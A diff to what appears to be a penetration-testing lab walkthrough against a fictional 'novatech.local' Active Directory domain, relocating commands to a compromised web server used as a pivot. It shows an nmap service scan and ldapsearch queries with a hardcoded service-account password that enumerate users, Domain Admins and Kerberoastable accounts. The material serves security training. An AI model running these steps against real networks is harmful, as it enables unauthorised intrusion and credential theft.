@@ -647,8 +647,8 @@ done; wait
 ```
 
 ```bash
-[WEB01]
-# Service scan against discovered Windows hosts
+[KALI]
+# Service scan against discovered Windows hosts — run from Kali (nmap pre-installed)
 # -sV: detect service versions   -p: only scan relevant ports
 nmap -sV -p 135,139,389,445,636,3389,5985,5986 \
   192.168.10.10 192.168.10.20 192.168.10.50 2>/dev/null
@@ -717,23 +717,26 @@ This single credential opens the entire AD directory for enumeration from this L
 
 ### 3.4 Active Directory Enumeration from Linux
 
-**Why ldapsearch:** We have valid AD credentials and port 389 (LDAP) is open on DC01. We don't need
-any Windows tools — `ldapsearch` speaks the LDAP protocol natively from Linux. This enumerates
-every user, group, and service principal in the domain.
+**Why web01 as pivot:** web01 sits on `192.168.10.100` — the same segment as DC01. Kali is on
+`attacker_net` and Windows Firewall on DC01 blocks LDAP from outside the domain. The compromised
+server is the natural pivot: `ldapsearch` speaks LDAP natively from Linux, no Windows tools needed.
 
 ```bash
-[KALI — or WEB01: run wherever you prefer]
+[WEB01]
+# Install ldap-utils if not present (attackers do this routinely on a live target)
+apt-get install -y ldap-utils 2>/dev/null | tail -1
+
 # Enumerate all domain user accounts
-# -x: simple auth   -H: LDAP URI   -D: bind DN   -w: password
+# -x: simple auth   -H: LDAP URI   -D: bind DN (UPN format for AD)
 # -b: search base   "(objectClass=user)": filter for user objects
 ldapsearch -x \
   -H ldap://192.168.10.10 \
-  -D "cn=svc_ldap,dc=novatech,dc=local" \
+  -D "svc_ldap@novatech.local" \
   -w "NovaTech2021!" \
   -b "dc=novatech,dc=local" \
   "(objectClass=user)" \
   sAMAccountName description department userAccountControl \
-  2>/dev/null | grep -E "^sAMAccountName|^description|^department"
+  | grep -E "^sAMAccountName|^description|^department"
 ```
 
 **Expected:**
@@ -751,11 +754,11 @@ description: Kerberoastable backup service account
 ```
 
 ```bash
-[KALI]
+[WEB01]
 # Find Domain Admins group members
 ldapsearch -x \
   -H ldap://192.168.10.10 \
-  -D "cn=svc_ldap,dc=novatech,dc=local" \
+  -D "svc_ldap@novatech.local" \
   -w "NovaTech2021!" \
   -b "cn=Domain Admins,cn=Users,dc=novatech,dc=local" \
   "(objectClass=group)" member \
@@ -765,13 +768,13 @@ ldapsearch -x \
 **Expected:** `member: CN=Administrator,CN=Users,DC=novatech,DC=local`
 
 ```bash
-[KALI]
+[WEB01]
 # CRITICAL: find Kerberoastable accounts — users with SPNs registered
 # SPN (Service Principal Name) presence means a valid TGS ticket can be requested
 # and cracked offline — no DC interaction needed after the initial request
 ldapsearch -x \
   -H ldap://192.168.10.10 \
-  -D "cn=svc_ldap,dc=novatech,dc=local" \
+  -D "svc_ldap@novatech.local" \
   -w "NovaTech2021!" \
   -b "dc=novatech,dc=local" \
   "(&(objectClass=user)(servicePrincipalName=*))" \
